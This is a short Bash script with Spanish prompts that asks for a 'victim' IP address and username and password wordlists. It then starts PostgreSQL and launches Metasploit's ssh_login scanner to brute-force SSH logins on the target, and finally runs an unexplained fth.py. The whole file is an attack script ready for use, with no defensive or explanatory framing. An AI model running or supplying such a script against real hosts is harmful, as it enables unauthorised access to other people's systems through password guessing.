#!/usr/bin/bash

function ssh_clear {
       clear
}
function ssh_space {
        echo
}

echo -e '\n\n                      Bienvenido a la aventura ssh \n\n'
ssh_space
read -p 'Ingresa  la ip victima $ ' rhost
ssh_space
read -p 'Ingresa la ruta de tu diccionario pass $ ' pass_file
ssh_space
read -p 'Ingresa l ruta de tu dicciomario user $ ' user_file
ssh_space
echo -e '\n\nEjecutando postgresql ...\n\n'
sudo service postgresql start
echo -e '\n                    [listo espere ........]'
msfconsole -x "use auxiliary/scanner/ssh/ssh_login;\
set rhost $rhost;\
set pass_file $pass_file;\
set user_file $user_file;\
set verbose yes;\
run"
python3 fth.py